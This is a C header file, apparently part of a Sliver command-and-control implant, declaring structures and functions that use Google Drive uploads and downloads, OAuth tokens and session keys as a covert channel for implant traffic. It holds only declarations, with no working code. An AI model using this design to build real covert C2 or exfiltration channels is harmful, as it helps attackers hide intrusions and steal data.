#pragma once

typedef struct _DRIVE_CONFIG {
	HTTP_CONFIG HttpConfig;
	LPSTR lpClientId;
	LPSTR lpClientSecret;
	LPSTR lpRefreshToken;
} DRIVE_CONFIG, *PDRIVE_CONFIG;

typedef struct _SLIVER_DRIVE_CLIENT {
	DRIVE_CONFIG DriveConfig;
	CHAR szSessionID[33];
	CHAR szSliverName[32];
	CHAR szConfigID[32];
	UINT64 uPeerID;
	PBYTE pSessionKey;
	LPSTR lpRecipientPubKey;
	LPSTR lpPeerPubKey;
	LPSTR lpPeerPrivKey;
	DWORD cbSessionKey;
	LPSTR lpSendPrefix;
	LPSTR lpRecvPrefix;
	UINT64 uEncoderNonce;
	DWORD dwMaxErrors;
	LPSTR lpServerMinisignPublicKey;
	BOOL IsClosed;
} SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;

PDRIVE_CONFIG GoogleDriveInit
(
	_In_ LPSTR lpUserAgent,
	_In_ LPSTR lpClientId,
	_In_ LPSTR lpSecret,
	_In_ LPSTR lpRefreshToken
);

BOOL RefreshAccessToken
(
	PDRIVE_CONFIG This
);

BOOL GoogleDriveUpload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPWSTR lpFilePath
);

BOOL GetFileId
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpName,
	_Out_ LPSTR* pId
);

PBYTE GoogleDriveDownload
(
	_In_ PDRIVE_CONFIG This,
	_In_ LPSTR lpFileId,
	_Out_ PDWORD pcbOutput
);

VOID FreeDriveConfig
(
	_In_ PDRIVE_CONFIG pDriveConfig
);